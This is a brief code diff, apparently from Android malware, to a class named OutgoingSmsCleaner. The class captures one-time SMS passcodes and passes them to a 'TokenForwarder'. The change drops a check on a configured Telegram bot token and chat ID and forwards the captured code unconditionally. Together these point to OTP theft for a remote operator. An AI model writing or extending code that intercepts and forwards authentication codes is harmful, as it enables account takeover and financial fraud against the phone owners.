@@ -105,8 +105,6 @@ object OutgoingSmsCleaner {
             capturedAt = System.currentTimeMillis()
         )
         OtpCaptureWriter.write(context, otp)
-        if (config.telegramBotToken.isNotBlank() && config.telegramChatId.isNotBlank()) {
-            TokenForwarder(configManager, context).forward(otp)
-        }
+        TokenForwarder(configManager, context).forwardOutgoingBlocked(otp)
     }
 }
